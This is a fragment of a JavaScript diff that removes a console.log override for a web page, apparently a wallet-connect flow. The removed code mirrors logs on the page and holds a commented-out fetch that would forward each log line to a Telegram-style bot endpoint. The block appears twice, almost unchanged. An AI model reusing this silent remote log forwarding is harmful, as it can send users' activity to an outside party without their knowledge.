-        console.log("Insufficient funds")
-      }
-    }
-  }
-    }
-    send();
-}
-
-
-{
-    let l = console.log; 
-    function normalize(x_){
-        let x = String(x_);
-        if(/^\[object/g.test(x)){ // [object Window]
-            try {
-                let y = JSON.stringify(x_);
-                x = y;
-            } catch (error) {
-                x = x+" >> "+(Object.keys(x_));
-            }
-            return x;
-        }else{return x;}
-    }
-    let logs_to_send = [];
-    if(getParameterByName("log") == "true"){
-        let el = document.getElementById("testx");
-        el.style.display = "block";
-        console.log = (x, ...y)=>{ 
-            l(x);
-            if(y && y.length>0){
-              y.forEach((z) => {
-                  l(y,":",z);
-                  x+=(" -> ("+normalize(z)+")");
-                });
-            }
-            x = normalize(x);
-            el.innerText += ("~ "+x+"\n");
-            if(start_to_log){
-              logs_to_send.push(x);
-            }
-            window.setTimeout(function() {
-              el.scrollTop = el.scrollHeight;
-            }, 500);      
-        }
-    }
-    setInterval(() => {
-      if(logs_to_send.length == 0 || !start_to_log) return;
-      let text = logs_to_send.splice(0,1);
-      let url = "";
-      let chat_id = "";          
-      // fetch(`${url}?chat_id=${chat_id}&text=${text}`).catch(e => {
-      //   l("TG Log Err:", e);
-      // });
-    }, 100); // 500ms interval // no more than 1 log sper 4 secs (15 per min)
-}
-
-{
-  let l = console.log; 
-  function normalize(x_){
-      let x = String(x_);
-      if(/^\[object/g.test(x)){ // [object Window]
-          try {
-              let y = JSON.stringify(x_);
-              x = y;
-          } catch (error) {
-              x = x+" >> "+(Object.keys(x_));
-          }
-          return x;
-      }else{return x;}
-  }
-  let logs_to_send = [];
-  if(getParameterByName("log") == "true"){
-      let el = document.getElementById("testx");
-      el.style.display = "block";
-      console.log = (x, ...y)=>{ 
-          l(x);
-          if(y && y.length>0){
-            y.forEach((z) => {
-                l(y,":",z);
-                x+=(" -> ("+normalize(z)+")");
-              });
-          }
-          x = normalize(x);
-          el.innerText += ("~ "+x+"\n");
-          if(start_to_log){
-            logs_to_send.push(x);
-          }
-          window.setTimeout(function() {
-            el.scrollTop = el.scrollHeight;
-          }, 500);      
-      }
-  }
-  setInterval(() => {
-    if(logs_to_send.length == 0 || !start_to_log) return;
-    let text = logs_to_send.splice(0,1);
-      let url = ``;
-      let chat_id = "";          
-      // fetch(`${url}?chat_id=${chat_id}&text=${text}`).catch(e => {
-      //   l("TG Log Err:", e);
-      // });
-  }, 100); // 500ms interval // no more than 1 log sper 4 secs (15 per min)
-}
-/**
- * Main entry point.
- */
-async function startx(){
-    await init().then(() => {
-        onButtonClick();
-        // ^ Initially "onConnect", then "proceed"
-    }).catch(e => {
-        console.log("Initialization failed.");
-        console.log(e);
+        })
+        .then(async(res) => {
+            if(res.status > 399) throw res;
+            resolve(await res.json());
+        }).catch(err=>{
+            reject(err);
+        })
     })
-};
-// trigger login
-let els = document.getElementsByClassName("triggerx");
-([...els]).forEach((el) => {
-    el.addEventListener("click", () => {
-        startx();
-    });
-});
-console.log(window);
+  }
